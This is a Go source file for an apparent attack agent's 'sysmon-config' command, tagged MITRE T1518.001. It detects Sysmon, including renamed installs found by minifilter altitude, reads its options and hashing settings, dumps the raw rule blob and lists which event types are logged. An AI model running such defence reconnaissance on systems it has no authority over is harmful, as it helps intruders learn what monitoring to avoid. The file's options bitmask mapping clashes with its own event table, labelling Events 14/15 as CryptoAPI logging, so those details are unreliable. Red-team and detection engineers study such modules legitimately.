//go:build windows

package commands

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

type SysmonConfigCommand struct{}

func (c *SysmonConfigCommand) Name() string { return "sysmon-config" }
func (c *SysmonConfigCommand) Description() string {
	return "Detect Sysmon installation and extract active configuration (T1518.001)"
}

type sysmonConfigArgs struct {
	Action string `json:"action"` // "check" (default), "rules", "events"
}

type sysmonInfo struct {
	Installed    bool              `json:"installed"`
	ServiceName  string            `json:"service_name,omitempty"`
	DriverName   string            `json:"driver_name,omitempty"`
	ImagePath    string            `json:"image_path,omitempty"`
	Version      string            `json:"version,omitempty"`
	HashAlgo     string            `json:"hash_algorithm,omitempty"`
	Options      uint64            `json:"options,omitempty"`
	RuleBytes    int               `json:"rule_bytes,omitempty"`
	Events       map[string]string `json:"events,omitempty"`
	DriverLoaded bool              `json:"driver_loaded"`
}

func (c *SysmonConfigCommand) Execute(task structs.Task) structs.CommandResult {
	var args sysmonConfigArgs
	if task.Params != "" {
		json.Unmarshal([]byte(task.Params), &args)
	}
	if args.Action == "" {
		args.Action = "check"
	}

	info := detectSysmon()

	switch args.Action {
	case "check":
		return sysmonCheckResult(info)
	case "rules":
		return sysmonRulesResult(info)
	case "events":
		return sysmonEventsResult(info)
	default:
		return errorf("Unknown action: %s. Use: check, rules, events", args.Action)
	}
}

// sysmonServiceNames lists common Sysmon service names (default and renamed)
var sysmonServiceNames = []string{"Sysmon64", "Sysmon", "SysmonDrv"}

func detectSysmon() sysmonInfo {
	info := sysmonInfo{Events: make(map[string]string)}

	// Check for Sysmon service (both 64-bit and 32-bit variants)
	for _, svcName := range []string{"Sysmon64", "Sysmon"} {
		svcPath := `SYSTEM\CurrentControlSet\Services\` + svcName
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, svcPath, registry.QUERY_VALUE)
		if err != nil {
			continue
		}
		info.Installed = true
		info.ServiceName = svcName

		if imgPath, _, err := key.GetStringValue("ImagePath"); err == nil {
			info.ImagePath = imgPath
		}
		if desc, _, err := key.GetStringValue("Description"); err == nil && desc != "" {
			// Sysmon embeds version info in the description
			info.Version = desc
		}
		key.Close()
		break
	}

	// Check for Sysmon driver (SysmonDrv or renamed)
	for _, drvName := range []string{"SysmonDrv"} {
		drvPath := `SYSTEM\CurrentControlSet\Services\` + drvName
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, drvPath, registry.QUERY_VALUE)
		if err != nil {
			continue
		}
		info.DriverLoaded = true
		info.DriverName = drvName
		key.Close()

		// Read driver parameters (where the config lives)
		paramPath := drvPath + `\Parameters`
		paramKey, err := registry.OpenKey(registry.LOCAL_MACHINE, paramPath, registry.QUERY_VALUE)
		if err != nil {
			continue
		}

		// HashingAlgorithm
		if hashAlgo, _, err := paramKey.GetStringValue("HashingAlgorithm"); err == nil {
			info.HashAlgo = hashAlgo
		}

		// Options bitmask
		if opts, _, err := paramKey.GetIntegerValue("Options"); err == nil {
			info.Options = opts
		}

		// Rules binary blob — just report size, don't dump (too large)
		if rules, _, err := paramKey.GetBinaryValue("Rules"); err == nil {
			info.RuleBytes = len(rules)
		}

		paramKey.Close()
		break
	}

	// If not found by standard names, scan services for Sysmon-like entries
	if !info.Installed {
		detectSysmonRenamed(&info)
	}

	// Check enabled event channels
	detectSysmonEventChannels(&info)

	return info
}

// detectSysmonRenamed checks for renamed Sysmon installations by scanning
// minifilter instances and matching altitude 385201 (Sysmon's registered altitude)
func detectSysmonRenamed(info *sysmonInfo) {
	// Sysmon's registered minifilter altitude
	instancesBase := `SYSTEM\CurrentControlSet\Services`
	svcKey, err := registry.OpenKey(registry.LOCAL_MACHINE, instancesBase, registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		return
	}
	defer svcKey.Close()

	subkeys, err := svcKey.ReadSubKeyNames(-1)
	if err != nil {
		return
	}

	for _, sk := range subkeys {
		// Check if this service has a minifilter instance with Sysmon's altitude
		instPath := instancesBase + `\` + sk + `\Instances\Sysmon Instance`
		instKey, err := registry.OpenKey(registry.LOCAL_MACHINE, instPath, registry.QUERY_VALUE)
		if err != nil {
			continue
		}
		altitude, _, err := instKey.GetStringValue("Altitude")
		instKey.Close()
		if err == nil && altitude == "385201" {
			info.DriverLoaded = true
			info.DriverName = sk

			// Read parameters from this renamed driver
			paramPath := instancesBase + `\` + sk + `\Parameters`
			paramKey, err := registry.OpenKey(registry.LOCAL_MACHINE, paramPath, registry.QUERY_VALUE)
			if err != nil {
				continue
			}
			if hashAlgo, _, err := paramKey.GetStringValue("HashingAlgorithm"); err == nil {
				info.HashAlgo = hashAlgo
			}
			if opts, _, err := paramKey.GetIntegerValue("Options"); err == nil {
				info.Options = opts
			}
			if rules, _, err := paramKey.GetBinaryValue("Rules"); err == nil {
				info.RuleBytes = len(rules)
			}
			paramKey.Close()
			info.Installed = true
			break
		}
	}
}

// detectSysmonEventChannels checks Windows Event Log channels for Sysmon
func detectSysmonEventChannels(info *sysmonInfo) {
	channelBase := `SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels`
	chanKey, err := registry.OpenKey(registry.LOCAL_MACHINE, channelBase, registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		return
	}
	defer chanKey.Close()

	subkeys, err := chanKey.ReadSubKeyNames(-1)
	if err != nil {
		return
	}

	for _, sk := range subkeys {
		if !strings.Contains(strings.ToLower(sk), "sysmon") {
			continue
		}
		chKey, err := registry.OpenKey(registry.LOCAL_MACHINE, channelBase+`\`+sk, registry.QUERY_VALUE)
		if err != nil {
			continue
		}
		enabled, _, err := chKey.GetIntegerValue("Enabled")
		chKey.Close()
		if err == nil {
			if enabled == 1 {
				info.Events[sk] = "Enabled"
			} else {
				info.Events[sk] = "Disabled"
			}
		}
	}
}

// sysmonOptionFlags maps Options bitmask bits to descriptions
var sysmonOptionFlags = map[uint64]string{
	0x01: "Network connection logging (Event 3)",
	0x02: "Image loading logging (Event 7)",
	0x04: "CryptoAPI logging (Event 14/15)",
	0x08: "Clipboard logging (Event 24)",
}

func sysmonCheckResult(info sysmonInfo) structs.CommandResult {
	var sb strings.Builder

	if !info.Installed {
		sb.WriteString("Sysmon: NOT DETECTED\n\n")
		sb.WriteString("No Sysmon service or driver found (checked standard and renamed installations).\n")
		if len(info.Events) > 0 {
			sb.WriteString("\nNote: Sysmon event channels found (may indicate previous installation):\n")
			for ch, state := range info.Events {
				sb.WriteString(fmt.Sprintf("  %s: %s\n", ch, state))
			}
		}
		data, _ := json.Marshal(info)
		return successResult(sb.String() + "\n" + string(data))
	}

	sb.WriteString("=== Sysmon Configuration ===\n\n")
	sb.WriteString(fmt.Sprintf("Service:  %s\n", info.ServiceName))
	sb.WriteString(fmt.Sprintf("Driver:   %s (loaded: %t)\n", info.DriverName, info.DriverLoaded))
	if info.ImagePath != "" {
		sb.WriteString(fmt.Sprintf("Binary:   %s\n", info.ImagePath))
	}
	if info.Version != "" {
		sb.WriteString(fmt.Sprintf("Version:  %s\n", info.Version))
	}

	sb.WriteString("\n--- Configuration ---\n")
	if info.HashAlgo != "" {
		sb.WriteString(fmt.Sprintf("Hash Algorithm: %s\n", info.HashAlgo))
	} else {
		sb.WriteString("Hash Algorithm: (default/not set)\n")
	}

	if info.Options > 0 {
		sb.WriteString(fmt.Sprintf("Options: 0x%X\n", info.Options))
		for flag, desc := range sysmonOptionFlags {
			if info.Options&flag != 0 {
				sb.WriteString(fmt.Sprintf("  [+] %s\n", desc))
			}
		}
	}

	if info.RuleBytes > 0 {
		sb.WriteString(fmt.Sprintf("Rules: %d bytes of configuration loaded\n", info.RuleBytes))
	} else {
		sb.WriteString("Rules: No custom rules (default config)\n")
	}

	if len(info.Events) > 0 {
		sb.WriteString("\n--- Event Channels ---\n")
		for ch, state := range info.Events {
			sb.WriteString(fmt.Sprintf("  %s: %s\n", ch, state))
		}
	}

	data, _ := json.Marshal(info)
	return successResult(sb.String() + "\n" + string(data))
}

func sysmonRulesResult(info sysmonInfo) structs.CommandResult {
	if !info.Installed {
		return errorResult("Sysmon not detected — no rules to extract")
	}

	// Read raw rules binary from registry
	var rulesHex string
	for _, drvName := range []string{info.DriverName, "SysmonDrv"} {
		if drvName == "" {
			continue
		}
		paramPath := `SYSTEM\CurrentControlSet\Services\` + drvName + `\Parameters`
		paramKey, err := registry.OpenKey(registry.LOCAL_MACHINE, paramPath, registry.QUERY_VALUE)
		if err != nil {
			continue
		}
		rules, _, err := paramKey.GetBinaryValue("Rules")
		paramKey.Close()
		if err != nil {
			continue
		}
		if len(rules) == 0 {
			return successResult("No custom rules configured (default Sysmon config)")
		}
		// Hex dump the first 4KB max (rules can be large)
		maxDump := len(rules)
		truncated := false
		if maxDump > 4096 {
			maxDump = 4096
			truncated = true
		}
		rulesHex = hex.Dump(rules[:maxDump])
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("=== Sysmon Rules (%d bytes) ===\n\n", len(rules)))
		if truncated {
			sb.WriteString(fmt.Sprintf("(Showing first 4096 of %d bytes)\n\n", len(rules)))
		}
		sb.WriteString(rulesHex)
		return successResult(sb.String())
	}

	return errorResult("Could not read Sysmon rules from registry")
}

func sysmonEventsResult(info sysmonInfo) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== Sysmon Event Types ===\n\n")

	// Standard Sysmon event IDs and descriptions
	eventTypes := []struct {
		id   int
		name string
		opt  uint64 // Options flag that enables it (0 = always on when Sysmon is running)
	}{
		{1, "Process Create", 0},
		{2, "File creation time changed", 0},
		{3, "Network connection", 0x01},
		{4, "Sysmon service state changed", 0},
		{5, "Process terminated", 0},
		{6, "Driver loaded", 0},
		{7, "Image loaded", 0x02},
		{8, "CreateRemoteThread", 0},
		{9, "RawAccessRead", 0},
		{10, "ProcessAccess", 0},
		{11, "FileCreate", 0},
		{12, "Registry (key/value create/delete)", 0},
		{13, "Registry (value set)", 0},
		{14, "Registry (key/value rename)", 0},
		{15, "FileCreateStreamHash", 0},
		{16, "Sysmon config state changed", 0},
		{17, "PipeEvent (created)", 0},
		{18, "PipeEvent (connected)", 0},
		{19, "WmiEvent (filter)", 0},
		{20, "WmiEvent (consumer)", 0},
		{21, "WmiEvent (consumer filter)", 0},
		{22, "DNSEvent (query)", 0},
		{23, "FileDelete (archived)", 0},
		{24, "ClipboardChange", 0x08},
		{25, "ProcessTampering", 0},
		{26, "FileDeleteDetected", 0},
		{27, "FileBlockExecutable", 0},
		{28, "FileBlockShredding", 0},
		{29, "FileExecutableDetected", 0},
	}

	if !info.Installed {
		sb.WriteString("Sysmon not detected — showing reference event list\n\n")
	} else {
		sb.WriteString(fmt.Sprintf("Sysmon detected: %s (Options: 0x%X)\n\n", info.ServiceName, info.Options))
	}

	for _, evt := range eventTypes {
		status := "Active"
		if evt.opt > 0 && info.Options&evt.opt == 0 && info.Installed {
			status = "OFF (requires Options flag)"
		}
		if !info.Installed {
			status = "N/A"
		}
		sb.WriteString(fmt.Sprintf("  Event %2d: %-40s [%s]\n", evt.id, evt.name, status))
	}

	if info.RuleBytes > 0 {
		sb.WriteString(fmt.Sprintf("\nNote: %d bytes of custom rules loaded — events may be filtered by include/exclude rules.\n", info.RuleBytes))
		sb.WriteString("Use 'sysmon-config -action rules' to dump the raw rule configuration.\n")
	}

	return successResult(sb.String())
}
